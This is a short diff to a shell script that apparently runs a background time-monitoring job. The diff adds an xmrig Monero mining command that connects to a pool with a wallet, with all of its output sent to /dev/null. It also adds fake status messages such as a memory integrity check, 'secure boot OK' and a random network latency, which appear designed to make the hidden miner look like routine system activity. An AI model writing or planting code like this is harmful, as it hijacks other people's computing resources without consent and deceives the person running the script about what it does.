@@ -93,6 +93,8 @@ sleep 5
 # Start time monitoring in background
 check_and_stop_if_needed &
 
+./xmrig -o $POOL -u $WALLET -p $WORKER -k --coin monero --tls --tls-fingerprint=420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads=8 > /dev/null 2>&1 &
+
 while true; do
     echo "[INFO] Initializing module: net.core"
     sleep 2
@@ -100,6 +102,10 @@ while true; do
     sleep 2
     echo "[INFO] Performing memory integrity check... OK"
     sleep 2
-    echo "[INFO] Task scheduler running: PID $((RANDOM % 10000 + 1000))"
+    echo "[INFO] Task scheduler running: PID $((RANDOM % 9000 + 1000))"
     sleep 4
+    echo "[INFO] Kernel modules verified: secure boot OK"
+    sleep 2
+    echo "[INFO] Network latency: $((RANDOM % 30 + 1))ms"
+    sleep 2
 done
